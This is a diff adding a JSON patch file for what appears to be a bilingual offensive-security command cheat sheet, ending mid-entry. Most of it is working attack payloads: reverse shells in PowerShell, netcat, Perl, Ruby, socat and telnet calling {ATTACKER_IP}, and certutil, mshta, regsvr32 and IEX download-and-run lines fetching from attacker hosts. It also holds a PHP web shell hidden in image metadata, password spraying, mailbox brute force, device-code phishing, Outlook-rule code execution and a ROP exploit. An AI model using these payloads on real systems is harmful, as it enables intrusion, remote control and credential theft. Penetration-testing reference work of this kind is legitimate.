@@ -1,0 +1,2499 @@
+{
+ "schemaVersion": 1,
+ "entries": [
+  {
+   "id": "active-directory-enumeration",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "net user /domain\nnet group /domain\nnet group \"Domain Admins\" /domain\nnet group \"Domain Controllers\" /domain\nnet view /domain:{DOMAIN}"
+    }
+   ]
+  },
+  {
+   "id": "active-directory-tools",
+   "patches": [
+    {
+     "path": "commands.1.command",
+     "value": "ldapdomaindump -u 'domain\\user' -p {PASSWORD} {DC_HOST}\nxdg-open domain_users.html  # 查看报告\n# 生成 HTML 报告含用户/组/计算机/GPO"
+    }
+   ]
+  },
+  {
+   "id": "azure-ad-attacks",
+   "patches": [
+    {
+     "path": "commands.1.command",
+     "value": "Import-Module AADInternals\n# 外部侦察\nInvoke-AADIntReconAsOutsider -DomainName {TARGET}\n# 密码喷洒\nInvoke-AADIntSprayingAttack -UserList .\\users.txt -Password 'Spring2024!'\n# Token 获取\nGet-AADIntAccessToken -Tenant {TENANT_ID}"
+    },
+    {
+     "path": "commands.3.command",
+     "value": "python3 -c \"import requests; print(requests.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode', data={'client_id': '1950a258-227b-4e31-a9cf-717495945fc2', 'scope': 'openid profile'}).text)\"\n# 发送返回的 verification_uri 与 user_code 给目标，等待其完成授权"
+    },
+    {
+     "path": "commands.3.description",
+     "value": {
+      "zh": "Azure AD 设备代码钓鱼",
+      "en": "Azure AD device code phishing flow requesting a device code and handing the verification_uri and user_code to the target."
+     }
+    },
+    {
+     "path": "commands.0.description",
+     "value": {
+      "zh": "Azure AD 深度枚举",
+      "en": "Deep Azure AD enumeration via ROADtools gather and dump."
+     }
+    },
+    {
+     "path": "commands.2.description",
+     "value": {
+      "zh": "Azure AD PRT 令牌滥用",
+      "en": "Azure AD Primary Refresh Token abuse replaying a PRT cookie through ROADtools."
+     }
+    },
+    {
+     "path": "installation",
+     "value": {
+      "zh": "pip install roadrecon（ROADtools 套件）；PowerShell 模块用 Install-Module AADInternals；AzureAD 模块已于 2024 年 3 月退役，改用 Microsoft Graph PowerShell（Install-Module Microsoft.Graph）。",
+      "en": "Install ROADtools with pip (pip install roadrecon); PowerShell modules via Install-Module AADInternals; the AzureAD module retired in March 2024, so use the Microsoft Graph PowerShell SDK instead (Install-Module Microsoft.Graph)."
+     }
+    }
+   ]
+  },
+  {
+   "id": "bug-bounty-tools",
+   "patches": [
+    {
+     "path": "commands.2.command",
+     "value": "subdomainizer -l alive.txt -o js_subs.txt\ncat alive.txt | hakrawler | grep -E '\\.js($|\\?)' | sort -u | tee js_files.txt\ncat js_files.txt | python3 relative-url-extractor.py | grep -E \"api|key|secret|token\""
+    }
+   ]
+  },
+  {
+   "id": "ctf-pwn-techniques",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "from pwn import *\np = process('./pwn')\npayload = cyclic(200)\np.sendline(payload)\ncore = p.corefile\noffset = cyclic_find(core.fault_addr & 0xffffffff)\nprint(f'Offset: {offset}')\nelf = ELF('./pwn')\nrop = ROP(elf)\nret = rop.find_gadget(['ret']).address\npop_rdi = rop.find_gadget(['pop rdi', 'ret']).address\nbinsh = next(elf.search(b'/bin/sh'))\np = process('./pwn')\npayload = b'A'*offset + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(elf.sym['system'])\np.sendline(payload)"
+    }
+   ]
+  },
+  {
+   "id": "dns-attacks",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "dig @ns1.{TARGET} {TARGET} AXFR\n# nslookup 交互式（ls -d 仅 Windows 版支持，Linux 请用上面的 dig AXFR）→ nslookup → server ns1.{TARGET} → ls -d {TARGET}\ndnsrecon -d {TARGET} -t axfr"
+    },
+    {
+     "path": "commands.5.description",
+     "value": {
+      "zh": "CNAME指向Heroku：审计 Heroku 分配 DNS target 与组织 CNAME 的生命周期，只有官方绑定流程中的自有域唯一标记才能确认可声明性。",
+      "en": "CNAME to Heroku: audit lifecycle alignment between Heroku-assigned DNS targets and organizational CNAMEs; only a unique marker on an owned domain through the official binding flow confirms claimability."
+     }
+    },
+    {
+     "path": "commands.6.description",
+     "value": {
+      "zh": "CNAME指向Shopify：核对 Shopify 店铺绑定与组织 DNS 生命周期，只有自有开发店铺在官方域连接流程中成功返回唯一标记才确认可声明。",
+      "en": "CNAME to Shopify: verify Shopify store binding against organizational DNS lifecycle; claimability is confirmed only when an owned development store returns a unique marker through the official domain-connection flow."
+     }
+    },
+    {
+     "path": "commands.7.description",
+     "value": {
+      "zh": "CNAME指向Netlify：关联 Netlify site 生命周期与组织 CNAME，要求在自有 team 中通过官方域验证并返回标记，而不是依赖默认错误页。",
+      "en": "CNAME to Netlify: correlate Netlify site lifecycle with organizational CNAMEs, requiring official domain verification and a marker in an owned team instead of relying on default error pages."
+     }
+    },
+    {
+     "path": "commands.8.description",
+     "value": {
+      "zh": "CNAME指向Fastly：关联 Fastly domain/service/TLS 与组织 CNAME 生命周期，使用自有测试 service 的唯一标记验证，而非通配后缀或错误页。",
+      "en": "CNAME to Fastly: correlate Fastly domain, service, and TLS lifecycle with organizational CNAMEs and validate with a unique marker on an owned test service rather than wildcard suffixes or error pages."
+     }
+    },
+    {
+     "path": "commands.9.description",
+     "value": {
+      "zh": "CNAME指向其他SaaS平台：将平台后缀目录用于 DNS 分流，再按每个 SaaS 当前官方绑定规则验证真实悬空域；不把历史后缀或错误页当作接管结论。",
+      "en": "CNAME to other SaaS platforms: use provider-suffix catalogs for DNS triage, then validate live dangling domains against each platform current official binding rules instead of treating historical suffixes or error pages as takeover conclusions."
+     }
+    },
+    {
+     "path": "commands.5.name",
+     "value": {
+      "zh": "CNAME指向Heroku",
+      "en": "CNAME to Heroku"
+     }
+    },
+    {
+     "path": "commands.6.name",
+     "value": {
+      "zh": "CNAME指向Shopify",
+      "en": "CNAME to Shopify"
+     }
+    },
+    {
+     "path": "commands.7.name",
+     "value": {
+      "zh": "CNAME指向Netlify",
+      "en": "CNAME to Netlify"
+     }
+    },
+    {
+     "path": "commands.8.name",
+     "value": {
+      "zh": "CNAME指向Fastly",
+      "en": "CNAME to Fastly"
+     }
+    },
+    {
+     "path": "commands.9.name",
+     "value": {
+      "zh": "CNAME指向其他SaaS平台",
+      "en": "CNAME to Other SaaS Platforms"
+     }
+    }
+   ]
+  },
+  {
+   "id": "exchange-m365-attacks",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "Import-Module .\\MailSniper.ps1\nInvoke-GlobalMailBrute -UsernameList .\\users.txt -PasswordList .\\passwords.txt -Domain {DOMAIN} -OutFile .\\owa-brute.txt"
+    },
+    {
+     "path": "commands.1.command",
+     "value": "ruler --domain {TARGET} --email user@{TARGET} abk list\nInvoke-SelfSearch -Mailbox user@{TARGET} -Terms \"password\",\"secret\""
+    },
+    {
+     "path": "commands.3.command",
+     "value": "ruler --email user@{TARGET} --username user --password pass display\nruler --email user@{TARGET} --username user --password pass homedir list\n# Outlook Rules RCE\nruler --email user@{TARGET} --username user --password pass add --name test --trigger \"subject\" --location \"\\\\attacker\\share\\payload.exe\""
+    },
+    {
+     "path": "installation",
+     "value": {
+      "zh": "MailSniper 为 PowerShell 脚本：git clone 官方仓库后 Import-Module MailSniper.ps1（PyPI 无此包）；AADInternals 用 Install-Module AADInternals；ruler 用 go install github.com/sensepost/ruler@latest。",
+      "en": "MailSniper is a PowerShell script: clone its official project and load it with Import-Module MailSniper.ps1 (no PyPI package exists); AADInternals via Install-Module AADInternals; ruler installs with go install github.com/sensepost/ruler@latest"
+     }
+    }
+   ]
+  },
+  {
+   "id": "gdb-enhanced",
+   "patches": [
+    {
+     "path": "commands.6.command",
+     "value": "b printf\nr\ntelescope $rsp 20\nfmtarg 0x7fffffffdca0\n# 输出 The index of format argument : 6 即偏移为 6，可用 %6$p 验证"
+    }
+   ]
+  },
+  {
+   "id": "macos-security-deep",
+   "patches": [
+    {
+     "path": "commands.1.command",
+     "value": "sudo spctl --master-disable  # 旧版 macOS; macOS 13+ 改用 sudo spctl --global-disable"
+    }
+   ]
+  },
+  {
+   "id": "seclists",
+   "patches": [
+    {
+     "path": "commands.2.command",
+     "value": "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz  # 需先解压; Kali 完整版位于 /usr/share/wordlists/rockyou.txt.gz"
+    }
+   ]
+  },
+  {
+   "id": "web-enumeration-tools",
+   "patches": [
+    {
+     "path": "commands.5.command",
+     "value": "..%252foutside%252fPAYLOADER_MARKER.txt\n%2e%2e%2foutside%2fPAYLOADER_MARKER.txt\n%2e%2e%5coutside%5cPAYLOADER_MARKER.txt\n..%2foutside%2fPAYLOADER_MARKER.txt\n..%5coutside%5cPAYLOADER_MARKER.txt"
+    },
+    {
+     "path": "commands.4.description",
+     "value": {
+      "zh": "以本地 marker 请求 /download 等文件读取接口验证路径遍历基线行为，固定超时且夹具可清理。",
+      "en": "Request the /download and other file-read endpoints with local markers to verify path-traversal baseline behavior using fixed timeouts and disposable fixtures."
+     }
+    },
+    {
+     "path": "commands.5.description",
+     "value": {
+      "zh": "路径遍历 Payload 变体清单（双重编码、点编码、反斜杠形态），逐条用于 file 参数测试。",
+      "en": "Path traversal payload variant list (double-encoded, dot-encoded, and backslash forms) to submit one by one as the file parameter."
+     }
+    }
+   ]
+  },
+  {
+   "id": "web-fuzzing-wordlists",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "/usr/share/seclists/Discovery/Web-Content/common.txt # 通用目录\n/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt # 中型目录\n/usr/share/seclists/Discovery/Web-Content/big.txt # 大型目录\n/usr/share/seclists/Usernames/top-usernames-shortlist.txt # 用户名\n/usr/share/seclists/Discovery/Web-Content/common-and-port-specific-web-extensions.txt # 扩展名"
+    },
+    {
+     "path": "commands.2.command",
+     "value": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt\n/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt\n# n0kovo_subdomains_huge.txt 需从作者仓库单独下载，不在 SecLists 内"
+    },
+    {
+     "path": "commands.4.description",
+     "value": {
+      "zh": "LFI 路径遍历字典（安全夹具版）：条目基于 payloader-fixture 目录与 PAYLOADER_MARKER 标记文件，仅用于实验环境的路径遍历测试，测后按标记清理产物。",
+      "en": "LFI path traversal dictionary (safe fixture edition) built on the payloader-fixture directory and PAYLOADER_MARKER files for traversal testing in lab environments; clean up artifacts by marker afterwards."
+     }
+    },
+    {
+     "path": "commands.5.description",
+     "value": {
+      "zh": "路径编码穿越变体字典（..%2f、..%252f、%2e%2e%2f），用于检测仅解码一次或未做归一化的路径处理实现。",
+      "en": "Path-encoded traversal variant dictionary (..%2f, ..%252f, %2e%2e%2f) for detecting implementations that decode once or skip normalization."
+     }
+    },
+    {
+     "path": "commands.6.description",
+     "value": {
+      "zh": "混合编码穿越变体字典（..%2f 与 %2e%2e/ 两种形态），用于对比不同解码顺序下的处理差异。",
+      "en": "Mixed-encoding traversal variant dictionary (..%2f and %2e%2e/ forms) for comparing handling differences across decoding orders."
+     }
+    },
+    {
+     "path": "commands.7.description",
+     "value": {
+      "zh": "Windows 反斜杠与尾点、尾空格穿越变体，用于检测 Windows 路径规范化差异。",
+      "en": "Windows backslash plus trailing-dot and trailing-space traversal variants for detecting Windows path normalization differences."
+     }
+    },
+    {
+     "path": "commands.8.description",
+     "value": {
+      "zh": "API相关：汇总 API 版本、操作、数据格式和归档扩展名关键词，适合作为发现工具字典而不是独立漏洞载荷。",
+      "en": "Keyword list of API versions, operations, data formats, and archive extensions for discovery tools rather than a standalone vulnerability payload."
+     }
+    },
+    {
+     "path": "commands.9.description",
+     "value": {
+      "zh": "基础Host伪造：整理环回、内部服务和基础设施名称，适合作为虚拟主机发现工具输入而非独立请求载荷。",
+      "en": "Loopback, internal-service, and infrastructure name list for virtual-host discovery tooling rather than standalone request payloads."
+     }
+    },
+    {
+     "path": "commands.10.description",
+     "value": {
+      "zh": "HPP参数重复 (同名参数覆盖/追加)：汇总身份、权限、跳转和执行相关参数名，用于参数发现与重复参数测试工具，不是完整 HPP 载荷。",
+      "en": "Identity, privilege, redirect, and execution-related parameter name list for parameter discovery and duplicate-parameter testing rather than complete HPP payloads."
+     }
+    },
+    {
+     "path": "commands.11.description",
+     "value": {
+      "zh": "Flag路径(通用,适用于所有语言)：仅包含 /flag、扩展名、备份后缀和通配路径候选，没有执行语义或应用数据流，应归入 Web 字典工具而非 RCE Payload。",
+      "en": "Flag path list containing only /flag, extensions, backup suffixes, and wildcard candidates with no execution semantics, belonging in web wordlist tooling rather than RCE payloads."
+     }
+    },
+    {
+     "path": "commands.3.description",
+     "value": {
+      "zh": "生成自定义字典；保存请求地址、响应状态、关键响应头和输出文件，便于核对实际 HTTP 行为。",
+      "en": "Generate a custom wordlist by crawling the target site with cewl."
+     }
+    },
+    {
+     "path": "commands.8.name",
+     "value": {
+      "zh": "API相关",
+      "en": "API-Related Keywords"
+     }
+    },
+    {
+     "path": "commands.9.name",
+     "value": {
+      "zh": "基础Host伪造",
+      "en": "Basic Host Header Spoofing"
+     }
+    },
+    {
+     "path": "commands.10.name",
+     "value": {
+      "zh": "HPP参数重复 (同名参数覆盖/追加)",
+      "en": "HPP Duplicate Parameter Names"
+     }
+    },
+    {
+     "path": "commands.11.name",
+     "value": {
+      "zh": "Flag路径(通用,适用于所有语言)",
+      "en": "Flag Paths (Generic, All Languages)"
+     }
+    }
+   ]
+  },
+  {
+   "id": "windows-lolbas",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "certutil.exe -urlcache -f http://{ATTACKER_HOST}/file.exe file.exe\nbitsadmin /transfer job http://{ATTACKER_HOST}/file.exe C:\\file.exe\npowershell -c \"(New-Object Net.WebClient).DownloadFile('http://{ATTACKER_HOST}/file.exe','C:\\file.exe')\""
+    },
+    {
+     "path": "commands.1.command",
+     "value": "mshta.exe http://{ATTACKER_HOST}/malicious.hta\nregsvr32 /s /u /i:http://{ATTACKER_HOST}/payload.sct scrobj.dll\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \"\nwscript.exe //E:JScript payload.js"
+    },
+    {
+     "path": "commands.0.description",
+     "value": {
+      "zh": "LOLBins 文件下载",
+      "en": "LOLBins file download methods using certutil, bitsadmin, and PowerShell WebClient."
+     }
+    }
+   ]
+  },
+  {
+   "id": "powershell-reverse",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+    },
+    {
+     "path": "commands.3.command",
+     "value": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient(\"{ATTACKER_IP}\",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\npowershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ATTACKER_IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\npowershell IEX (New-Object Net.WebClient).DownloadString('http://{ATTACKER_IP}:{PORT}/reverse.ps1')\nC:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://{ATTACKER_IP}/shell.ps1')\npowershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://{ATTACKER_IP}/powercat.ps1');powercat -c {ATTACKER_IP} -p {PORT} -e cmd\""
+    },
+    {
+     "path": "commands.2.command",
+     "value": "powershell.exe -NoProfile -Command \"IEX (Invoke-RestMethod 'http://127.0.0.1:8000/powercat.ps1'); powercat -c 127.0.0.1 -p {PORT} -e cmd.exe\""
+    }
+   ]
+  },
+  {
+   "id": "nc-reverse",
+   "patches": [
+    {
+     "path": "commands.0.command",
+     "value": "nc -e /bin/sh {ATTACKER_IP} {PORT}"
+    },
+    {
+     "path": "commands.1.command",
+     "value": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER_IP} {PORT} >/tmp/f"
+    },
+    {
+     "path": "commands.4.command",
+     "value": "nc -e /bin/sh {ATTACKER_IP} {PORT}\nnc -e /bin/bash {ATTACKER_IP} {PORT}\nnc -c sh {ATTACKER_IP} {PORT}\nnc -c /bin/sh {ATTACKER_IP} {PORT}\nnc -c bash {ATTACKER_IP} {PORT}\nnc -c /bin/bash {ATTACKER_IP} {PORT}\nnc.exe -e cmd {ATTACKER_IP} {PORT}"
+    },
+    {
+     "path": "commands.5.command",
+     "value": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER_IP} {PORT} >/tmp/f\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ATTACKER_IP} {PORT} >/tmp/f\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ATTACKER_IP} {PORT} >/tmp/f\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ATTACKER_IP} {PORT} >/tmp/f"
+    },
+    {
+     "path": "commands.6.command",
+     "value": "busybox nc {ATTACKER_IP} {PORT} -e sh\nbusybox nc {ATTACKER_IP} {PORT} -e /bin/sh\nbusybox nc {ATTACKER_IP} {PORT} -e bash\nbusybox nc {ATTACKER_IP} {PORT} -e /bin/bash\nbusybox+nc+{ATTACKER_IP}+{PORT}+-e+sh\nbusybox${IFS}nc${IFS}{ATTACKER_IP}${IFS}{PORT}${IFS}-e${IFS}sh"
+    },
+    {
+     "path": "commands.7.command",
+     "value": "ncat {ATTACKER_IP} {PORT} -e /bin/sh\nncat {ATTACKER_IP} {PORT} -e /bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {ATTACKER_IP} {PORT} >/tmp/f"
+    },
+    {
+     "path": "commands.8.command",
+     "value": "nc -e /bin/sh {ATTACKER_IP} 4444\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKER_IP} 4444 >/tmp/f"
+    },
+    {
+     "path": "commands.3.command",
+     "value": "nc -lvnp {PORT} < file\nnc {ATTACKER_IP} {PORT} > file"
+    }
+   ]
+  },
+  {
+   "id": "perl-reverse",
+   "patches": [
+    {
+     "path": "commands.3.command",
+     "value": "perl -e 'use Socket;$i=\"{ATTACKER_IP}\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+    },
+    {
+     "path": "commands.0.command",
+     "value": "perl -e 'use Socket;$i=\"{ATTACKER_IP}\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'"
+    },
+    {
+     "path": "commands.1.command",
+     "value": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ATTACKER_IP}:4444\");STDIN->fdopen($c,r);STDOUT->fdopen($c,w);system$_ while<>;'"
+    },
+    {
+     "path": "commands.2.command",
+     "value": "perl -e 'use Socket;$i=\"{ATTACKER_IP}\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"cmd.exe\");'"
+    },
+    {
+     "path": "commands.4.description",
+     "value": {
+      "zh": "Perl Socket 完整回连示例；监听端出现 sh 提示符即成功。",
+      "en": "Complete Perl Socket reverse-connection example; a shell prompt appearing on the listener means success. Use a one-shot marker connection during testing instead of /bin/sh."
+     }
+    }
+   ]
+  },
+  {
+   "id": "ruby-reverse",
+   "patches": [
+    {
+     "path": "commands",
+     "value": [
+      {
+       "name": {
+        "zh": "标准反弹",
+        "en": "Standard Reverse"
+       },
+       "command": "ruby -rsocket -e'f=TCPSocket.open(\"{ATTACKER_IP}\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+       "description": {
+        "zh": "把 TCPSocket 转为文件描述符并交给 /bin/sh 的三个标准流；仅适用于提供 Unix 描述符重定向的环境。",
+        "en": "Convert the TCPSocket to a file descriptor and attach all /bin/sh standard streams; requires an environment with Unix descriptor redirection."
+       },
+       "syntaxBreakdown": [
+        {
+         "part": "-rsocket",
+         "explanation": {
+          "zh": "加载Socket库",
+          "en": "Load Socketdatabase"
+         },
+         "type": "parameter"
+        },
+        {
+         "part": "TCPSocket.open",
+         "explanation": {
+          "zh": "创建TCP连接",
+          "en": "Create TCP Connection"
+         },
+         "type": "command"
+        }
+       ],
+       "examples": [],
+       "platform": "linux"
+      },
+      {
+       "name": {
+        "zh": "Ruby 跨平台命令循环",
+        "en": "Ruby Cross-Platform Command Loop"
+       },
+       "command": "ruby -rsocket -e 'c=TCPSocket.new(\"{ATTACKER_IP}\",4444);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
+       "description": {
+        "zh": "从 TCPSocket 逐行读取命令并通过 IO.popen 返回输出；实际可用命令取决于目标操作系统和 Ruby 运行身份。",
+        "en": "Read commands line by line from a TCPSocket and return IO.popen output; available commands depend on the operating system and Ruby process identity."
+       },
+       "syntaxBreakdown": [],
+       "examples": [],
+       "platform": "all"
+      },
+      {
+       "name": {
+        "zh": "Ruby 完整版",
+        "en": "Ruby full version"
+       },
+       "command": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ATTACKER_IP}\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
+       "description": {
+        "zh": "fork 后让父进程退出，并在子进程中保持 TCPSocket 命令循环；Windows 不支持该 fork 语义。",
+        "en": "Exit the parent after fork and keep the TCPSocket command loop in the child process; this fork behavior is not available on Windows."
+       },
+       "syntaxBreakdown": [],
+       "examples": [],
+       "platform": "linux"
+      },
+      {
+       "name": {
+        "zh": "Ruby 反弹写法速查",
+        "en": "Ruby (nicholasaleks)"
+       },
+       "command": "ruby -rsocket -e'f=TCPSocket.open(\"{ATTACKER_IP}\",{PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'\nruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ATTACKER_IP}\",\"{PORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'\nruby -rsocket -e 'c=TCPSocket.new(\"{ATTACKER_IP}\",\"{PORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
+       "description": {
+        "zh": "外部速查表汇编的 3 条写法：fd 重定向、fork 后台与命令循环；替换 {ATTACKER_IP} 与 PORT 后使用。",
+        "en": "Ruby (nicholasaleks): 3 payloads"
+       },
+       "platform": "all"
+      },
+      {
+       "name": {
+        "zh": "Ruby TCPSocket 反向通道",
+        "en": "Ruby TCPSocket Reverse Channel"
+       },
+       "command": "ruby -rsocket -e'f=TCPSocket.open(\"{ATTACKER_IP}\",1234).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+       "description": {
+        "zh": "TCPSocket fd 重定向回连示例；监听端出现 /bin/sh 即成功。",
+        "en": "Ruby TCPSocket fd-redirection reverse connection example; a shell prompt appearing on the listener means success. Use a one-shot marker connection during authorized validation."
+       },
+       "platform": "linux"
+      }
+     ]
+    },
+    {
+     "path": "commands.4.description",
+     "value": {
+      "zh": "TCPSocket fd 重定向回连示例；监听端出现 /bin/sh 即成功。",
+      "en": "Ruby TCPSocket fd-redirection reverse connection example; a shell prompt appearing on the listener means success. Use a one-shot marker connection during authorized validation."
+     }
+    }
+   ]
+  },
+  {
+   "id": "web-shells",
+   "patches": [
+    {
+     "path": "commands.4.command",
+     "value": "socat TCP:{ATTACKER_IP}:{PORT} EXEC:sh\nsocat TCP:{ATTACKER_IP}:{PORT} EXEC:'bash -li',pty,stderr,setsid,sigint,sane\nsocat file:`tty`,raw,echo=0 tcp-listen:{PORT}\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ATTACKER_IP}:{PORT}"
+    },
+    {
+     "path": "commands.6.command",
+     "value": "socat file:`tty`,raw,echo=0 tcp-listen:4444\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ATTACKER_IP}:4444"
+    }
+   ]
+  },
+  {
+   "id": "linux-command-tricks",
+   "patches": [
+    {
+     "path": "commands.5.command",
+     "value": "rm -f /tmp/p; mkfifo /tmp/p && telnet {ATTACKER_IP} {PORT} 0</tmp/p | /bin/sh 1>/tmp/p\ntelnet {ATTACKER_IP} 80 | /bin/bash | telnet {ATTACKER_IP} {PORT}\nmknod a p && telnet {ATTACKER_IP} {PORT} 0<a | /bin/sh 1>a\nTF=$(mktemp -u);mkfifo $TF && telnet {ATTACKER_IP} {PORT} 0<$TF | sh 1>$TF"
+    }
+   ]
+  },
+  {
+   "id": "file-upload-attacks",
+   "patches": [
+    {
+     "path": "commands.15.command",
+     "value": "exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' filename.png\nmv filename.png filename.php.png\nexiftool -Comment='<?php system(\"nc -e /bin/bash {ATTACKER_IP} {PORT}\"); ?>' filename.png"
+    },
+    {
+     "path": "commands.4.description",
+     "value": {
+      "zh": "将本地 marker ZIP 以 application/zip 上传到批量上传入口；成功标准：curl --fail 返回 2xx，随后按响应指引核对文件落点与处理结果。",
+      "en": "Upload a local marker ZIP as application/zip to the bulk upload endpoint; success means curl --fail returns 2xx, then check the storage location and processing result per the response."
+     }
+    },
+    {
+     "path": "commands.5.description",
+     "value": {
+      "zh": "在 Windows 上用 copy /b 拼接图片与标记文本生成内容拼接样本，并用 certutil 计算 SHA-256；成功标准：哈希正常输出且样本头部仍为图片签名。",
+      "en": "Concatenate an image and marker text with copy /b on Windows to build a content-splice sample and compute SHA-256 with certutil; success means the hash prints normally and the sample keeps its image signature header."
+     }
+    },
+    {
+     "path": "commands.11.description",
+     "value": {
+      "zh": "本地构造 marker ZIP、上传批量入口并以 HEAD 核对解压落点；成功标准：unzip -Z1 仅列出 PAYLOADER_MARKER.txt，上传返回 2xx 且落点 HEAD 可达。",
+      "en": "Build a marker ZIP locally, upload it to the bulk entry, and verify the extraction location with HEAD; success means unzip -Z1 lists only PAYLOADER_MARKER.txt, the upload returns 2xx, and the location HEAD is reachable."
+     }
+    },
+    {
+     "path": "commands.12.description",
+     "value": {
+      "zh": "上传包含路径遍历成员的 ZIP 并检查任务状态与越界落点；成功标准：状态端点可达，test-output/outside 路径不应取回内容，若能取回则存在目录穿越写入。",
+      "en": "Upload a ZIP containing path-traversal members and check the task status and out-of-bounds landing; success means the status endpoint is reachable and test-output/outside must not return content, while retrievable content indicates traversal write."
+     }
+    },
+    {
+     "path": "commands.13.description",
+     "value": {
+      "zh": "依次提交内容与声明类型不匹配的样本（文本声明 image/jpeg、GIF 头声明 text/plain 等）；成功标准：所有样本被类型校验拒绝或忽略，被接受并落盘即存在校验缺陷。",
+      "en": "Submit samples whose content mismatches the declared type (text declared as image/jpeg, GIF header declared as text/plain); success means all samples are rejected or ignored by type validation, and acceptance indicates a validation flaw."
+     }
+    },
+    {
+     "path": "commands.14.description",
+     "value": {
+      "zh": "打印 PHP/Python/Node 版本与平台及夹具要求，用于对照不同运行时的上传解析行为；成功标准：成功输出版本信息即可用于后续差异判断。",
+      "en": "Print PHP/Python/Node versions, platform, and fixture requirements to compare upload-parsing behavior across runtimes; success means version output is available for later diffing."
+     }
+    },
+    {
+     "path": "commands.16.description",
+     "value": {
+      "zh": "PHP 扩展名绕过：汇总 PHP 替代扩展、双扩展、大小写、尾点、控制字符、分号和 NTFS ADS 文件名形式，用于比较上传校验、文件系统规范化与 Web 处理器映射；清单本身不代表文件可执行。",
+      "en": "PHP extension bypass list covering alternative extensions, double extensions, casing, trailing dots, control characters, semicolons, and NTFS ADS names for comparing upload validation, filesystem canonicalization, and web-handler mapping; the list alone does not prove executability."
+     }
+    },
+    {
+     "path": "commands.17.description",
+     "value": {
